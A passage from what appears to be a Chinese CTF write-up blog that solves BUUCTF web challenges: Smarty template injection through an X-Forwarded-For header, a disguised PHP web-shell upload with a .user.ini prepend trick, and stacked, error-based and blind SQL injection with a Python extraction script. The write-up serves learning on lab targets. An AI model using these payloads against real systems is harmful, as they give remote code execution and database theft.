class="language-xml">Your IP is : bootstrap</span><br><span class="language-xml">css</span><br><span class="language-xml">flag.php</span><br><span class="language-xml">header.php</span><br><span class="language-xml">hint.php</span><br><span class="language-xml">img</span><br><span class="language-xml">index.php</span><br><span class="language-xml">jquery</span><br><span class="language-xml">libs</span><br><span class="language-xml">templates_c</span><br><span class="language-xml">templates_c</span><br><span class="language-xml"></span><br><span class="language-xml">X-Forwarded-For: </span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">system</span>(<span class="hljs-name">ls</span> /)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">Your IP is : <span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">b</span>&gt;</span>Fatal error<span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span>:  Uncaught  --<span class="hljs-symbol">&amp;gt;</span> Smarty Compiler: Syntax error in template <span class="hljs-symbol">&amp;quot;</span>string:</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">system</span>(<span class="hljs-name">ls</span> /)&#125;&#125;</span><span class="language-xml"><span class="hljs-symbol">&amp;quot;</span>  on line 1 <span class="hljs-symbol">&amp;quot;</span></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">system</span>(<span class="hljs-name">ls</span> /)&#125;&#125;</span><span class="language-xml"><span class="hljs-symbol">&amp;quot;</span>  - Unexpected <span class="hljs-symbol">&amp;quot;</span>)<span class="hljs-symbol">&amp;quot;</span> <span class="hljs-symbol">&amp;lt;</span>-- </span><br><span class="language-xml">thrown in <span class="hljs-tag">&lt;<span class="hljs-name">b</span>&gt;</span>/var/www/html/libs/sysplugins/smarty_internal_templatecompilerbase.php<span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span> on line <span class="hljs-tag">&lt;<span class="hljs-name">b</span>&gt;</span>1</span><br><span class="language-xml"></span><br><span class="language-xml">X-Forwarded-For: </span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">system</span>(<span class="hljs-name">&#x27;ls /&#x27;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">Your IP is : bin</span><br><span class="language-xml">dev</span><br><span class="language-xml">etc</span><br><span class="language-xml">flag</span><br><span class="language-xml">home</span><br><span class="language-xml">lib</span><br><span class="language-xml">media</span><br><span class="language-xml">mnt</span><br><span class="language-xml">opt</span><br><span class="language-xml">proc</span><br><span class="language-xml">root</span><br><span class="language-xml">run</span><br><span class="language-xml">sbin</span><br><span class="language-xml">srv</span><br><span class="language-xml">sys</span><br><span class="language-xml">tmp</span><br><span class="language-xml">usr</span><br><span class="language-xml">var</span><br><span class="language-xml">var</span><br><span class="language-xml"></span><br><span class="language-xml">X-Forwarded-For: </span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">system</span>(<span class="hljs-name">&#x27;cat /flag&#x27;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">//拿到flag</span><br></code></pre></td></tr></table></figure><p>Flask可能存在Jinjia2模版注入漏洞<br>PHP可能存在Twig模版注入漏洞<br>源wp<br><a href="https://blog.csdn.net/weixin_44037296/article/details/111410565">https://blog.csdn.net/weixin_44037296/article/details/111410565</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>note-33</title>
    <link href="/2025/05/07/note-33/"/>
    <url>/2025/05/07/note-33/</url>
    
    <content type="html"><![CDATA[<h1 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h1><p>传正常图片提示里面有&lt;?不给传，传码看看：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/index.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>5f2a0c7d-2bd7-429f-8299-9f0f5b659699.node5.buuoj.cn:81<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>407<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://5f2a0c7d-2bd7-429f-8299-9f0f5b659699.node5.buuoj.cn:81<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryE46PLUBJtp0zgdcj<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://5f2a0c7d-2bd7-429f-8299-9f0f5b659699.node5.buuoj.cn:81/index.php<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryE46PLUBJtp0zgdcj</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;fileUpload&quot;; filename=&quot;php.jpg&quot;</span><br><span class="language-pgsql">Content-<span class="hljs-keyword">Type</span>: image/jpg</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">&lt;script <span class="hljs-keyword">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;@eval($_POST[shell]);&lt;/script&gt;</span><br><span class="language-pgsql">&lt;script <span class="hljs-keyword">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);&lt;/script&gt;</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryE46PLUBJtp0zgdcj</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;upload&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">提交</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryE46PLUBJtp0zgdcj--</span></span><br></code></pre></td></tr></table></figure><p>提示：<br>exif_imagetype:not image!</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/index.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>5f2a0c7d-2bd7-429f-8299-9f0f5b659699.node5.buuoj.cn:81<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>403<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://5f2a0c7d-2bd7-429f-8299-9f0f5b659699.node5.buuoj.cn:81<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundary8mJUC80q1aGOXScd<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://5f2a0c7d-2bd7-429f-8299-9f0f5b659699.node5.buuoj.cn:81/index.php<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundary8mJUC80q1aGOXScd</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;fileUpload&quot;; filename=&quot;php2.jpg&quot;</span><br><span class="language-pgsql">Content-<span class="hljs-keyword">Type</span>: image/jpg</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">FFD8FF</span><br><span class="language-pgsql">&lt;script <span class="hljs-keyword">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;@eval($_POST[shell]);&lt;/script&gt;</span><br><span class="language-pgsql">&lt;script <span class="hljs-keyword">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);&lt;/script&gt;</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundary8mJUC80q1aGOXScd</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;upload&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">提交</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundary8mJUC80q1aGOXScd--</span></span><br></code></pre></td></tr></table></figure><p>提示：<br>exif_imagetype:not image!</p><p>这次换个文件头：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/index.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>5f2a0c7d-2bd7-429f-8299-9f0f5b659699.node5.buuoj.cn:81<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>403<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://5f2a0c7d-2bd7-429f-8299-9f0f5b659699.node5.buuoj.cn:81<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundary3I0b63Tc4FZzgA5s<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://5f2a0c7d-2bd7-429f-8299-9f0f5b659699.node5.buuoj.cn:81/index.php<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundary3I0b63Tc4FZzgA5s</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;fileUpload&quot;; filename=&quot;php2.jpg&quot;</span><br><span class="language-pgsql">Content-<span class="hljs-keyword">Type</span>: image/jpg</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">GIF89a</span><br><span class="language-pgsql">&lt;script <span class="hljs-keyword">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;@eval($_POST[shell]);&lt;/script&gt;</span><br><span class="language-pgsql">&lt;script <span class="hljs-keyword">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);&lt;/script&gt;</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundary3I0b63Tc4FZzgA5s</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;upload&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">提交</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundary3I0b63Tc4FZzgA5s--</span></span><br></code></pre></td></tr></table></figure><p>回显  </p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">Your dir uploads/<span class="hljs-number">9987</span>df285bb375eda68448315c5656e5<br>Your files :<br><span class="hljs-function"><span class="hljs-title">array</span><span class="hljs-params">(<span class="hljs-number">4</span>)</span></span> &#123; <span class="hljs-selector-attr">[0]</span>=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;.&quot;</span> <span class="hljs-selector-attr">[1]</span>=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">2</span>) <span class="hljs-string">&quot;..&quot;</span> <span class="hljs-selector-attr">[2]</span>=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">9</span>) <span class="hljs-string">&quot;index.php&quot;</span> <span class="hljs-selector-attr">[3]</span>=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">9</span>) <span class="hljs-string">&quot;php2.jpg&quot;</span> &#125;<br></code></pre></td></tr></table></figure><p>那目录就是<br>&#x2F;uploads&#x2F;9987df285bb375eda68448315c5656e5&#x2F;php2.jpg<br>蚂蚁又是连不上，但是这次是nginx服务器啊，<br>那可能就是user.ini文件了<br>提交：  </p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf">GIF89a<br>auto_prepend_file <span class="hljs-operator">=</span> php2.jpg<br></code></pre></td></tr></table></figure><p>回显：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">Your dir uploads/<span class="hljs-number">9987</span>df285bb375eda68448315c5656e5<br>Your files :<br><span class="hljs-function"><span class="hljs-title">array</span><span class="hljs-params">(<span class="hljs-number">5</span>)</span></span> &#123; <span class="hljs-selector-attr">[0]</span>=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;.&quot;</span> <span class="hljs-selector-attr">[1]</span>=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">2</span>) <span class="hljs-string">&quot;..&quot;</span> <span class="hljs-selector-attr">[2]</span>=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">9</span>) <span class="hljs-string">&quot;.user.ini&quot;</span> <span class="hljs-selector-attr">[3]</span>=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">9</span>) <span class="hljs-string">&quot;index.php&quot;</span> <span class="hljs-selector-attr">[4]</span>=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">9</span>) <span class="hljs-string">&quot;php2.jpg&quot;</span> &#125;<br></code></pre></td></tr></table></figure><p>这个.user.ini的大概用法是让目录下所有php文件包含上你指定的文件，看回显我上传的目录上是有一个index.php的，所以能用.user.ini的办法<br>蚂蚁连目录上的index.php即可<br>flag{e8b4a853-b79a-4497-912e-389a9fda03ba}</p><h1 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h1><p>应该是sql题</p><figure class="highlight sml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs sml"><span class="hljs-number">1</span><span class="hljs-symbol">&#x27;or</span>(<span class="hljs-number">1</span>=<span class="hljs-number">1</span>);<br><br>回显：<br><span class="hljs-built_in">array</span>(<span class="hljs-number">2</span>) &#123;<br>  [<span class="hljs-number">0</span>]=&gt;<br>  <span class="hljs-built_in">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;1&quot;</span><br>  [<span class="hljs-number">1</span>]=&gt;<br>  <span class="hljs-built_in">string</span>(<span class="hljs-number">7</span>) <span class="hljs-string">&quot;hahahah&quot;</span><br>&#125;<br><br><span class="hljs-built_in">array</span>(<span class="hljs-number">2</span>) &#123;<br>  [<span class="hljs-number">0</span>]=&gt;<br>  <span class="hljs-built_in">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;2&quot;</span><br>  [<span class="hljs-number">1</span>]=&gt;<br>  <span class="hljs-built_in">string</span>(<span class="hljs-number">12</span>) <span class="hljs-string">&quot;miaomiaomiao&quot;</span><br>&#125;<br><br><span class="hljs-built_in">array</span>(<span class="hljs-number">2</span>) &#123;<br>  [<span class="hljs-number">0</span>]=&gt;<br>  <span class="hljs-built_in">string</span>(<span class="hljs-number">6</span>) <span class="hljs-string">&quot;114514&quot;</span><br>  [<span class="hljs-number">1</span>]=&gt;<br>  <span class="hljs-built_in">string</span>(<span class="hljs-number">2</span>) <span class="hljs-string">&quot;ys&quot;</span><br>&#125;<br><br></code></pre></td></tr></table></figure><p>怎么好像做过原题  </p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-number">1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span><span class="hljs-meta">#</span><br>回显：<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">preg_match</span>(<span class="hljs-string">&quot;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i&quot;</span>,$inject);<br><br><span class="hljs-number">1</span>&#x27;<span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(<span class="hljs-number">1</span>=<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>)<span class="hljs-meta">#</span><br>ok<br>这样的话，感觉用sqlmap都行啊  <br>用了sqlmap默认，发现只能检索出数据库名<br>sumeqrq<span class="hljs-comment">@i</span><br><span class="hljs-comment">会不会是@</span>的问题？<br></code></pre></td></tr></table></figure><p>算了自己写个脚本吧</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br>name=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-comment"># for d in range(0,100):</span><br><span class="hljs-comment">#     url = &quot;http://708bd9b9-1fc7-485b-8d30-cf4721d3516a.node5.buuoj.cn:81/?inject=1%27and+length%28database%28%29%29%3D&#123;&#125;%23#&quot;.format(d)</span><br><span class="hljs-comment">#     re = requests.get(url)</span><br><span class="hljs-comment">#     print(&quot;testing&quot;,d)</span><br><span class="hljs-comment">#     if &#x27;hahahah&#x27; in re.text:</span><br><span class="hljs-comment">#         print(&quot;数据库名长度为：&quot;,d)</span><br><span class="hljs-comment">#         break</span><br><span class="hljs-keyword">for</span> d1 <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">11</span>):<br>    <span class="hljs-keyword">for</span> dn <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">137</span>):<br>        time.sleep(<span class="hljs-number">0.07</span>)<br>        url = <span class="hljs-string">&quot;http://708bd9b9-1fc7-485b-8d30-cf4721d3516a.node5.buuoj.cn:81/?inject=1%27and+ascii%28substr%28database%28%29%2C&#123;&#125;%2C1%29%29%3D&#123;&#125;%23#&quot;</span>.<span class="hljs-built_in">format</span>(d1,dn)<br>        re = requests.get(url)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;testing&quot;</span>,d1,<span class="hljs-built_in">chr</span>(dn),name)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;hahahah&#x27;</span> <span class="hljs-keyword">in</span> re.text:<br>            name=name+<span class="hljs-built_in">chr</span>(dn)<br>            <span class="hljs-built_in">print</span>(name)<br></code></pre></td></tr></table></figure><p>跑出来是 supersqli<br>但是无法用select和where，也许可以试试预编译？<br>1’;prepare hack from concat(‘sele’,’ct’,’*‘);execute hack;@<br>prepare也过滤了  </p><figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs wren"><span class="hljs-number">1</span>&#x27;<span class="hljs-variable">and</span> <span class="hljs-title function_">extractvalue</span>(<span class="hljs-number">1</span>,<span class="hljs-title function_">concat</span>(&#x27;<span class="hljs-operator">!</span>&#x27;,<span class="hljs-title function_">database</span>()))#<br><span class="hljs-comment">//error 1105 : XPATH syntax error: &#x27;!supersqli&#x27;</span><br><br><span class="hljs-number">1</span>&#x27;<span class="hljs-variable">and</span> <span class="hljs-title function_">extractvalue</span>(<span class="hljs-number">1</span>,<span class="hljs-title function_">concat</span>(&#x27;<span class="hljs-operator">!</span>&#x27;,<span class="hljs-variable">show</span> <span class="hljs-variable">tables</span> <span class="hljs-variable">name</span>))#<br><br><span class="hljs-number">1</span>&#x27;<span class="hljs-variable">and</span> <span class="hljs-title function_">extractvalue</span>(<span class="hljs-number">1</span>,<span class="hljs-title function_">concat</span>(&#x27;<span class="hljs-operator">!</span>&#x27;,@@<span class="hljs-variable">dir</span>))#<br><br><span class="hljs-number">1</span>&#x27;<span class="hljs-variable">and</span> <span class="hljs-title function_">extractvalue</span>(<span class="hljs-number">1</span>,<span class="hljs-title function_">concat</span>(&#x27;<span class="hljs-operator">!</span>&#x27;,<span class="hljs-title function_">user</span>()))#<br><span class="hljs-comment">//error 1105 : XPATH syntax error: &#x27;!root@localhost&#x27;</span><br><br>想用<span class="hljs-variable">rename</span>也被过滤了；<br><br><span class="hljs-number">1</span>&#x27;;<span class="hljs-variable">show</span> <span class="hljs-variable">databases</span>;#<br><br><span class="hljs-title function_">array</span>(2) &#123;<br>  [<span class="hljs-number">0</span>]<span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span><br>  <span class="hljs-title function_">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;1&quot;</span><br>  [<span class="hljs-number">1</span>]<span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span><br>  <span class="hljs-title function_">string</span>(<span class="hljs-number">7</span>) <span class="hljs-string">&quot;hahahah&quot;</span><br>&#125;<br><br><span class="hljs-title function_">array</span>(1) &#123;<br>  [<span class="hljs-number">0</span>]<span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span><br>  <span class="hljs-title function_">string</span>(<span class="hljs-number">11</span>) <span class="hljs-string">&quot;ctftraining&quot;</span><br>&#125;<br><br><span class="hljs-title function_">array</span>(1) &#123;<br>  [<span class="hljs-number">0</span>]<span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span><br>  <span class="hljs-title function_">string</span>(<span class="hljs-number">18</span>) <span class="hljs-string">&quot;information_schema&quot;</span><br>&#125;<br><br><span class="hljs-title function_">array</span>(1) &#123;<br>  [<span class="hljs-number">0</span>]<span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span><br>  <span class="hljs-title function_">string</span>(<span class="hljs-number">5</span>) <span class="hljs-string">&quot;mysql&quot;</span><br>&#125;<br><br><span class="hljs-title function_">array</span>(1) &#123;<br>  [<span class="hljs-number">0</span>]<span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span><br>  <span class="hljs-title function_">string</span>(<span class="hljs-number">18</span>) <span class="hljs-string">&quot;performance_schema&quot;</span><br>&#125;<br><br><span class="hljs-title function_">array</span>(1) &#123;<br>  [<span class="hljs-number">0</span>]<span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span><br>  <span class="hljs-title function_">string</span>(<span class="hljs-number">9</span>) <span class="hljs-string">&quot;supersqli&quot;</span><br>&#125;<br><br><span class="hljs-title function_">array</span>(1) &#123;<br>  [<span class="hljs-number">0</span>]<span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span><br>  <span class="hljs-title function_">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;test&quot;</span><br>&#125;<br><br><br><span class="hljs-number">1</span>&#x27;;<span class="hljs-variable">show</span> <span class="hljs-variable">tables</span> <span class="hljs-variable">from</span> supersqli;#<br><br><span class="hljs-title function_">array</span>(2) &#123;<br>  [<span class="hljs-number">0</span>]<span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span><br>  <span class="hljs-title function_">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;1&quot;</span><br>  [<span class="hljs-number">1</span>]<span class="hljs-operator">=</span><span 